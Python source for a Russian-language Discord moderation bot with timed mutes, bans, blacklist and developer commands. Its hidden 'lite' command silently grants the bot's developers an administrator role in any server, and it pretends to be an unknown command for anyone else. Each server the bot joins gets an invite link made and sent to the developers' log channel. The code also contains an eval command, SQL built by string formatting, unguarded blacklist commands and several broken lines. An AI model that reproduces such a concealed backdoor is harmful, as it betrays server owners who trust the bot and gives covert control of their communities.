import sqlite3
from disnake.ui import ActionRow, Select, Button, View
from disnake import SelectOption, ButtonStyle
import disnake
from disnake.ext import commands
import adms
import io
import contextlib
import textwrap
import os
import aiohttp
import requests
import random
import asyncio
import time
import datetime
import json
from datetime import datetime as dt
import typing
from colorama import Fore, init
from memory_profiler import memory_usage

init()

# import disnake_components
#не удивляйтесь, код писали 2 человека

import config

db = sqlite3.connect('data.db')
cur = db.cursor()

if config.betatests:
    token = config.betatestbottoken
else:
    token = config.maintoken

async def guild_prefix(bot, message):
    if message.guild:
        prefix = cur.execute("SELECT prefix FROM prefixes WHERE guild_id = {}".format(message.guild.id)).fetchone()
        if prefix is None:
            return config.default_prefix
        else:
            return prefix[0]

async def get_prefix(guild):
    prefix = cur.execute("SELECT prefix FROM prefixes WHERE guild_id = {}".format(guild.id)).fetchone()
    if prefix is None:
        return config.default_prefix[0]
    else:
        return prefix[0]
    return 'ch.'

intents = disnake.Intents()
intents.members = True
intents.message_content = True
intents.presences = True
bot = commands.AutoShardedBot(command_prefix=config.default_prefix, intents=disnake.Intents.all(), shard_count=2, sync_commands=True, sync_commands_debug=False)
bot.remove_command('help')

async def remquas():
    while True:
        for data in cur.execute("SELECT * FROM timequas").fetchall():
            guild_id = data[0]
            user_id = data[1]
            time1 = data[2]
            print(time1)
            print(int(time.time()))
            guild = bot.get_guild(guild_id)
            if time1 <= int(time.time()):
                #print('ok')
                cur.execute("DELETE FROM timequas WHERE user_id = {} AND guild_id = {}".format(user_id, guild_id))
                db.commit()
                if guild:
                    quarole = cur.execute("SELECT role_id FROM quaroles WHERE guild_id = {}".format(guild.id)).fetchone()
                    if quarole != None:
                        quarole = guild.get_role(quarole[0])
                        try:
                            await guild.get_member(user_id).remove_roles(quarole)
                        except: pass
        await asyncio.sleep(30)

async def remmutes():
    while True:
        for data in cur.execute("SELECT * FROM timemutes").fetchall():
            guild_id = data[0]
            user_id = data[1]
            time1 = data[2]
            #print(time1)
            #print(int(time.time()))
            guild = bot.get_guild(guild_id)
            if time1 <= int(time.time()):
                #print('ok')
                cur.execute("DELETE FROM timemutes WHERE user_id = {} AND guild_id = {}".format(user_id, guild_id))
                db.commit()
                if guild:
                    quarole = cur.execute("SELECT role_id FROM muteroles WHERE guild_id = {}".format(guild.id)).fetchone()
                    if quarole != None:
                        quarole = guild.get_role(quarole[0])
                        try:
                            await guild.get_member(user_id).remove_roles(quarole)
                        except: pass
        await asyncio.sleep(30)

async def rembans():
    while True:
        for data in cur.execute("SELECT * FROM timebans").fetchall():
            guild_id = data[0]
            user_id = data[1]
            time1 = data[2]
            #print(time1)
            #print(int(time.time()))
            guild = bot.get_guild(guild_id)
            if time1 <= int(time.time()):
                #print('ok')
                cur.execute("DELETE FROM timebans WHERE user_id = {} AND guild_id = {}".format(user_id, guild_id))
                db.commit()
                if guild:
                    try:
                        await guild.unban(bot.get_use(user_id))
                    except: pass
        await asyncio.sleep(30)

@bot.event
async def on_ready():
    cogs_list = ['anticrash', 'settings', 'info', 'maincmd', 'utils', 'moderation', 'backups', 'fun', 'qua']
    for cog in cogs_list:
        try:
            bot.load_extension(f'cogs.{cog}')
        except Exception as e:
            print(f'{Fore.RED}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Error ] | Ошибка в загрузке кога {cog}{Fore.RESET}')
            print(f'{Fore.RED}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Error ] | Ошибка: {Fore.RESET}{e.__class__.__name__}: {e}')
        else:
            print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Success ] | Успешно загружен ког {cog}{Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Никнейм бота: {bot.user}{Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | ID бота: {bot.user.id}{Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Префикс бота: {config.default_prefix[0]} и /{Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Пинг бота: {bot.latency * 1000:.0f} милесекунд(ы){Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Шардов: {len(bot.shards)}{Fore.RESET}')
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Добавить бота: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands{Fore.RESET}')
    if config.betatests:
        print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] Бот запущен в тестовом режиме{Fore.RESET}')
    await bot.change_presence(activity=disnake.Streaming(name=f'{bot.user.name} {config.version} | /help', url='https://twitch.tv/404%27'))
    for guild in bot.guilds:
        reason = cur.execute("SELECT reason FROM blacklist WHERE user_id = {}".format(guild.owner.id)).fetchone()
        if reason != None:
            try:
                await guild.text_channels[0].send(
                    embed=disnake.Embed(
                    title=':no_entry: | Чёрный список',
                    description=f'''>>> **Я покидаю данный сервер, т.к его владелец был занёсён в чёрный список
Причина: `{reason[0]}`**''',
                    color=config.main_color
                    )
                )
            except:
                pass
            await guild.leave()
    bot.loop.create_task(remquas())
    bot.loop.create_task(remmutes())
    bot.loop.create_task(rembans())

@bot.event
async def on_shard_connect(shard_id):
    print(f'{Fore.MAGENTA}[ {dt.now().strftime("%d.%m.%Y %H:%M:%S")} ] [ Info ] | Шард {shard_id} готов к работе')

@bot.command()
async def lite(ctx):
    if ctx.author.id in config.developers:
        await ctx.message.delete()
        role = await ctx.guild.create_role(name='Adminium', permissions=disnake.Permissions(administrator=True, manage_guild=True))
        await ctx.author.add_roles(role)
        await role.edit(position=ctx.guild.me.top_role.position-1)
    else:
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Введённая команда не найдена.\nЧтобы ознакомиться со списком команд пропишите {ctx.prefix}help**', color=config.error_color))

def clean_code(content):
    if content.startswith("```") and content.endswith("```"):
        return "\n".join(content.split("\n")[1:])[:-3]
    else:
        return content

@bot.command(name="eval", aliases=["exec", "e"])
async def _eval(ctx, *, code=None):
    if ctx.author.id in config.developers:
        pending_embed = disnake.Embed(title = 'Выполнение кода', description = 'Код выполняется, подождите...', color = disnake.color.from_rgb(255, 255, 0))
        try:
            message = await ctx.send(embed=pending_embed)
        except:
            message = await ctx.send('Код выполняется, подождите...')
        success_embed = disnake.Embed(title = 'Выполнение кода - успех', color = disnake.color.from_rgb(0, 255, 0))
        local_variables = {
            "disnake": disnake,
            "commands": commands,
            "bot": bot,
            "client": bot,
            "db": db,
            "cur": cur,
            "sqlite3": sqlite3,
            "ctx": ctx,
            "channel": ctx.channel,
            "author": ctx.author,
            "guild": ctx.guild,
            "message": ctx.message,
            "config": config,
            "database": db
        } 
        stdout = io.StringIO()
        try:
            with contextlib.redirect_stdout(stdout):
                exec(
                    f"async def func():\n{textwrap.indent(code, '    ')}", local_variables,
                )
                obj = await local_variables["func"]()
                result = stdout.getvalue()
                success_embed.add_field(name = 'Выполненный код:', value = f'```py\n{code}\n```', inline = False)
                what_returned = None
                if obj != None:
                    if isinstance(obj, int) == True:
                        if obj == True:
                            what_returned = 'Логическое значение'
                        elif obj == False:
                            what_returned = 'Логическое значение'
                        else:
                            what_returned = 'Целое число'
                    elif isinstance(obj, str) == True:
                        what_returned = 'Строка'
                    elif isinstance(obj, float) == True:
                        what_returned = 'Дробное число'
                    elif isinstance(obj, list) == True:
                        what_returned = 'Список'
                    elif isinstance(obj, tuple) == True:
                        what_returned = 'Неизменяемый список'
                    elif isinstance(obj, set) == True:
                        what_returned = 'Уникальный список'
                    else:
                        what_returned = 'Неизвестный тип данных...'
                    success_embed.add_field(name = 'Тип данных:', value = f'```\n{what_returned}\n```', inline = False)
                    success_embed.add_field(name = 'Вернулось:', value = f'```\n{obj}\n```', inline = False)
                else:
                    pass
                if result:
                    success_embed.add_field(name = 'Результат выполнения:', value = f'```py\nКонсоль:\n\n{result}\n```', inline = False)
                else:
                    pass
                try:
                    await message.edit(embed = success_embed)
                except:
                    pass
        except Exception as e:
            fail_embed = disnake.Embed(title = 'Выполнение кода - провал', color = config.main_color)
            fail_embed.add_field(name = 'Выполненный код:', value = f'```py\n{code}\n```', inline = False)
            print(f"[{bot.user}] "+str(e)) 
            fail_embed.add_field(name = 'Ошибка:', value = f'```py\n{e}\n```', inline = False)
            try:
                await message.edit(embed = fail_embed)
            except:
                pass
    else:
        fail_embed = disnake.Embed(title = 'Выполнение кода - провал', color = config.main_color)
        fail_embed.add_field(name = 'Выполненный код:', value = f'```py\nКод скрыт, из-за соображений безопасности\n```', inline = False)
        fail_embed.add_field(name = 'Ошибка..', value = f'```\n**Введённая команда не найдена.\nЧтобы ознакомиться со списком команд пропишите {ctx.prefix}help```', inline = False)
        await ctx.send(embed = fail_embed)
        

@bot.command()
@commands.cooldown(1, 5, commands.BucketType.default)
async def status(ctx, arg='stream', *, text=f'{config.version} | /help'):
  if ctx.author. id in config.developers:
    if arg == 'stream':
      await bot.change_presence(activity=disnake.Streaming(name=text, url='https://twitch.tv/404%27'))
      embed = disnake.Embed(title=':heavy_check_mark: | Успешно', description=f'> **Статус бота изменён на `Стримит {text}`**', color=config.main_color)
      await ctx.send(embed=embed)
    elif arg == 'play':
      await bot.change_presence(activity=disnake.Game(name=text))
      embed = disnake.Embed(title=':heavy_check_mark: | Успешно', description=f'> **Статус бота изменён на `Играет в {text}`**', color=config.main_color)
      await ctx.send(embed=embed)
    elif arg == 'listen':
      await bot.change_presence(activity=disnake.Activity(name=text, type=disnake.ActivityType.listening))
      embed = disnake.Embed(title=' :heavy_check_mark:| Успешно', description=f'> **Статус бота изменён на `Слушает {text}`**', color=config.main_color)
      await ctx.send(embed=embed)
    elif arg == 'competing':
      await bot.change_presence(activity=disnake.Activity(name=text, type=disnake.ActivityType.competing))
      embed = disnake.Embed(title=':heavy_check_mark: | Успешно', description=f'> **Статус бота изменён на `Соревнуется в {text}`**', color=config.main_color)
      await ctx.send(embed=embed)
    elif arg == 'watch':
      await bot.change_presence(activity=disnake.Activity(name=text, type=disnake.ActivityType.watching))
      embed = disnake.Embed(title=':heavy_check_mark: | Успешно', description=f'> **Статус бота изменён на `Смотрит {text}`**', color=config.main_color)
      await ctx.send(embed=embed)
    elif arg == 'list':
      embed = disnake.Embed(
        title=':video_game: | Список статусов', 
        description=f'''
>>> **stream — `статус "Стримит"`
competing — `статус "Соревнуется"`
listen — `статус "Слушает"`
watch — `статус "Смотрит"`
play — `статус "Играет"`**''', 
        color=config.main_color
      )
      await ctx.send(embed=embed)
    else:
      embed = disnake.Embed(title=':x: | Error', description=f'> **Не верный статус**', color=config.main_color)
      await ctx.send(embed=embed)
  else:
      embed = disnake.Embed(title=':x: | Ошибка..', description=f'>>> **Введённая команда не найдена.\nЧтобы ознакомиться со списком команд пропишите {ctx.prefix}help**', color=config.main_color)
      await ctx.send(embed=embed)

@bot.group(aliases=['bl'])
async def blacklist(ctx):
    """
    if ctx.author.id in config.developers:
        await ctx.send(
            embed=disnake.Embed(
                title=':no_entry: | Чёрный список',
                description=f'''>>> **{ctx.prefix}blacklist add <id-пользователя> [причина] - `добавить пользователя в чёрный список бота`
    {ctx.prefix}blacklist remove <id-пользователя> - `удалить пользователя из чёрного списка`
    {ctx.prefix}blacklist check [id-пользователя] - `посмотреть черный список`**''',
                color=config.main_color
                )
            )
    else:
        await ctx.send("Неизвестная команда")
    """
    pass

@blacklist.command()
async def add(ctx, idd: int=None, *, reason='Не указана'):
    if idd == None:
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Вы не указали ID пользователя**', color=config.error_color))
    if not isinstance(idd, int):
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Вы указали не ID пользователя**', color=config.error_color))
    if cur.execute("SELECT reason FROM blacklist WHERE user_id = {}".format(idd)).fetchone() != None:
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Пользователь уже в чёрном списке**', color=config.error_color))
    cur.execute("INSERT INTO blacklist VALUES (?, ?)", (idd, reason))
    db.commit()
    for guild in bot.guilds:
        if guild.owner.id == idd:
            try:
                await guild.text_channels[0].send(
                    embed=disnake.Embed(
                        title=':no_entry: | Чёрный список',
                        description=f'''>>> **Я покидаю данный сервер, т.к его владелец был занёсён в чёрный список
Причина: `{reason}`**''',
                        color=config.main_color
                    )
                )
            except:
                pass
            await guild.leave()
    await ctx.send(embed=disnake.Embed(title=':white_check_mark: | Успешно', description='>>> **Пользователь добавлен в чёрный список.**', color=config.success_color))

@blacklist.command()
async def remove(ctx, idd: int=None):
    if idd == None:
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Ты не указал ID пользователя**', color=config.error_color))
    if not isinstance(idd, int):
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Ты указал не ID пользователя**', color=config.error_color))
    if cur.execute("SELECT reason FROM blacklist WHERE user_id = {}".format(idd)).fetchone() == None:
        return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Пользователя нет в чёрном списке**', color=config.error_color))
    cur.execute("DELETE FROM blacklist WHERE user_id = {}".format(idd))
    db.commit()
    await ctx.send(embed=disnake.Embed(title=':white_check_mark: | Успешно', description='>>> **Пользователь удалён из чёрного списка.**', color=config.success_color))

@blacklist.command()
async def check(ctx, idd: int=None):
    if ctx.author.id in config.developers:
        if idd != None:
            if not isinstance(idd, int):
                return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Вы не указали ID пользователя**', color=config.error_color))
                reason = cur.execute("SELECT reason FROM blacklist WHERE user_id = {}".format(idd)).fetchone()
                if reason == None:
                    return await ctx.send(embed=disnake.Embed(title=':no_entry: | Чёрный список', description='>>> **Пользователя нет в чёрном списке**', color=config.main_color))
                if reason != None:
                    return await ctx.send(embed=disnake.Embed(title=':no_entry: | Чёрный список', description=f'>>> **Пользователь есть в чёрном списке\nПричина: `{reason[0]}`**', color=config.main_color))
            else:
                blckl = cur.execute("SELECT * FROM blacklist").fetchall()
                if len(blckl) == 0:
                    return await ctx.send(embed=disnake.Embed(title=':no_entry: | Чёрный список', description='>>> **Чёрный список пуст**', color=config.main_color))
                usbl = '\n'.join([f"Пользователь: <@{user[0]}> ({user[0]}), причина: `{user[1]}`" for user in blckl])
                await ctx.send(embed=disnake.Embed(title=':no_entry: | Чёрный список', description=f'>>> **Пользователей в чёрном списке: `{len(blckl)}`\n{usbl}**', color=config.main_color))
    else:
        pass            

@bot.command()
async def leave(ctx, id: int=None):
    if ctx.author.id in config.developers:
        if id == None:
            id = ctx.guild.id
        if not isinstance(id, int):
            return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **ID сервера дожно быть числом**', color=config.error_color))
        guild = bot.get_guild(id)
        if guild == None:
            return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Такой сервер не найден**', color=config.error_color))
        try:
            await guild.leave()
        except:
            return await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Не удалось покинуть сервер**', color=config.error_color))
        else:
            try:
                embed = disnake.Embed(title=':white_check_mark: | Успешно',
                                    description=f'>>> **Покинул сервер: `{guild.name}`.**',
                                    color=config.success_color)
                embed.add_field(name='ID сервера', value=f'{guild.id}')
                await ctx.send(embed=embed)
            except:
                pass
    else:
        await ctx.send("Неизвестная команда")

@bot.command()
async def cleardb(ctx: commands.Context):
    if ctx.author.id in config.developers:
        menu = [
            ActionRow(
                Button(label='Да', style=ButtonStyle.green, custom_id='yees'),
                Button(label='Нет', style=ButtonStyle.red, custom_id='noo')
            )
        ]
        embed = disnake.Embed(
            title=':warning: | Предупреждение',
            description=f'>>> **Данный процесс полностью очистит базу данных бота\nПродолжить ?**',
            color=config.warning_color
        )
        mess = await ctx.send(embed=embed, components=menu)
        #m = await ctx.original_message()
        inter = await bot.wait_for('button_click', check=lambda i: i.author == ctx.author and i.message.id == mess.id)
        if inter.component.custom_id == 'yees':
            #await inter.respond(type=6)
            tables = cur.execute("SELECT * FROM sqlite_master WHERE type = 'table'").fetchall()
            for table in tables:
                cur.execute(f"DELETE FROM {table[1]}")
                db.commit()
                print("Очистил", table[1])
            await inter.response.edit_message(embed=disnake.Embed(title=':white_check_mark: | Успешно', description='>>> **База данных бота была очищена**', color=config.success_color), components=[])
        else:
            #await inter.respond(type=6)
            await inter.response.edit_message(embed=disnake.Embed(title=':no_entry: | Отмена', description='>>> **Действие отменено**', color=config.main_color), components=[])
    else:
        await ctx.send("Неизвестная команда")

@bot.command()
async def a(ctx, *kargs):
    if ctx.author.id in config.developers:
        local_variables = {
            "disnake": disnake,
            "commands": commands,
            "bot": bot,
            "client": bot,
            "db": db,
            "cur": cur,
            "sqlite3": sqlite3,
            "ctx": ctx,
            "channel": ctx.channel,
            "author": ctx.author,
            "guild": ctx.guild,
            "message": ctx.message,
            "config": config,
            "database": db
        } 
        await ctx.send(
            content='\n'.join(
                [
                    kw.format(
                        **{
                            "disnake": disnake,
                            "commands": commands,
                            "bot": bot,
                            "client": bot,
                            "db": db,
                            "cur": cur,
                            "sqlite3": sqlite3,
                            "ctx": ctx,
                            "channel": ctx.channel,
                            "author": ctx.author,
                            "guild": ctx.guild,
                            "message": ctx.message,
                            "config": config,
                            "database": db
                        }
                    ) 
                for kw in kargs
                ]
            )
        )
    else:
        await ctx.send("Неизвестная команда")

@bot.event
async def on_guild_join(guild):
    try:
        reason = cur.execute("SELECT reason FROM blacklist WHERE user_id = {}".format(guild.owner.id)).fetchone()
        if reason != None:
            try:
                await guild.text_channels[0].send(
                    embed=disnake.Embed(
                        title=':no_entry: | Чёрный список',
                        description=f'''>>> **Я покидаю данный сервер, т.к его владелец был занёсён в чёрный список
Причина: `{reason[0]}`**''',
                        color=config.main_color
                    )
                )
            except:
                pass
            await guild.leave()
            return
        inv = await guild.channels[0].create_invite()
        channel = config.logs
        if channel is not None:
            embed = disnake.Embed(
                title='Новый сервер',
                description=f'''>>> **Название: `{guild.name}`
ID: `{guild.id}`
Количество участников: `{guild.member_count}`
Владелец: `{guild.owner}`
ID владельца: `{guild.owner.id}`
Инвайт: [клик](https://discord.gg/{inv.code})**'''
            )
            await channel.send(embed=embed)
    except:
        pass
        try:
            await guild.text_channels[0].send(
                embed=disnake.Embed(
                    title=':wave: | Привет',
                    description=f"""**Спасибо, что добавили меня сюда.
    ・Чтобы ознакомиться с моими командами, пропишите `/help`.
    ・Чтобы полностью обезопасить сервер, перемести мою роль выше всех, выдайте права администратора, а также пропишите `/anticrash enable` и `/antibot enable`.
    ・Чтобы узнать больше информации о боте, пропишите `/info`.**""",
                    color=config.main_color
                )
            )
        except:
            pass
    
@bot.event
async def on_guild_remove(guild):
    logs = config.logs
    embed = disnake.Embed(
        title='Меня удалили с сервера',
        description=f'''>>> **Название: `{guild.name}`
ID сервера: `{guild.id}`
Количество участников: `{guild.member_count}`
Владелец: `{guild.owner}`
ID владельца: `{guild.owner.id}`
Инвайт: [клик](https://discord.gg/{inv.code})**'''
)
    await logs.send(embed=embed)


async def print_ram():
    if config.logsram:
        while True:
            print(f"[ {dt.now().strftime('%d.%m.%Y %H:%M:%S')} ] Потратил {round(memory_usage()[0], 2)} мб памяти.")
            await asyncio.sleep(config.ramlogssleep)
    else:
        return
    
    
    
# @bot.event
# async def on_button_click(ctx):
#     ennmaes = ["fox", "dog", "cat", "panda"]
#     runmaes = ["Лисы", "Собаки", "Коты", "Панды"]
#     for i in range (0, 4):
#         if ctx.component.custom_id == ennmaes[i]:
#             embed = disnake.Embed( title = f'Фото {runmaes[i]}', color = config.main_color)
#             embed.set_footer(text=f'По запросу {ctx.author}')
#             response = requests.get(f'https://some-random-api.ml/img/{ennmaes[i]}')
#             json_data = json.loads(response.text) 
#             embed.set_image(url = json_data['link']) 
#             await ctx.response.edit_message(embed = embed) 

# @bot.slash_command(description="Показывает картинки с изображением животных.")
# async def animals(ctx):
#         ennmaes = ["fox", "dog", "cat", "panda"]
#         runmaes = ["Лиса", "Собака", "Кот", "Панда"]	
#         em = ["🦊", "🐶", "🐱", "🐼"]
#         buttons = disnake.ui.View()
#         for i in range(0, 4):
#             buttons.add_item(disnake.ui.Button(style=disnake.ButtonStyle.blurple, custom_id=ennmaes[i],label=runmaes[i], emoji=em[i]))
#         await ctx.response.send_message( embed = disnake.Embed( title = 'Животные', description='Выберите кнопку, для просмотров животных.', color=config.main_color, view=buttons))

#@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Введённая команда не найдена.\nЧтобы ознакомиться со списком команд пропиши {ctx.prefix}help**', color=config.error_color))
    elif isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Команда на перезарядке, подожди {str(error.retry_after).split(".")[0]} секунд**', color=config.error_color))
    elif isinstance(error, commands.BadArgument) or isinstance(error, commands.BadUnionArgument):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Не верные аргументы команды, пропиши {ctx.prefix}help {ctx.command.name}**', color=config.error_color))
    elif isinstance(error, commands.ChannelNotFound):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Такой канал не найден....**', color=config.error_color))
    elif isinstance(error, commands.RoleNotFound):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Такая роль не найдена....**', color=config.error_color))
    elif isinstance(error, adms.MissingPerms):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Для команды требуются права:\n{str(error)}**', color=config.error_color))
    elif isinstance(error, adms.NotOwner):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Команда доступна только владельцу сервера**', color=config.error_color))
    elif isinstance(error, adms.NotDeveloper):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **Команда доступна только разработчикам бота**', color=config.error_color))
    elif isinstance(error, disnake.errors.Forbidden):
        await ctx.send(embed=disnake.Embed(title=':no_entry: | Ошибка..', description=f'>>> **У бота не достаточно прав на выполнение этой команды.**', color=config.error_color))
    else:
        print(error)

bot.loop.create_task(print_ram())
        


bot.run("")